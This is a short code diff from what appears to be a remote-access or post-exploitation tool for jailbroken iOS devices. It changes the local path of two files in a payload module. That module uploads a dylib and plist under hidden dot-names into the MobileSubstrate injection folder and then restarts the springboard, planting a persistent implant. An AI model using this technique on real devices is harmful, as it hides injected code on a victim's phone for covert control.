@@ -6,6 +6,6 @@ class payload:
         self.id = 126
 
     def run(self,session,server,command):
-        server.uploadFile("src/binaries/eggshellPro.dylib","/Library/MobileSubstrate/DynamicLibraries/.espro.dylib",session.conn)
-        server.uploadFile("src/binaries/eggshellPro.plist","/Library/MobileSubstrate/DynamicLibraries/.espro.plist",session.conn)
+        server.uploadFile("src/resources/eggshellPro.dylib","/Library/MobileSubstrate/DynamicLibraries/.espro.dylib",session.conn)
+        server.uploadFile("src/resources/eggshellPro.plist","/Library/MobileSubstrate/DynamicLibraries/.espro.plist",session.conn)
         return "respring"
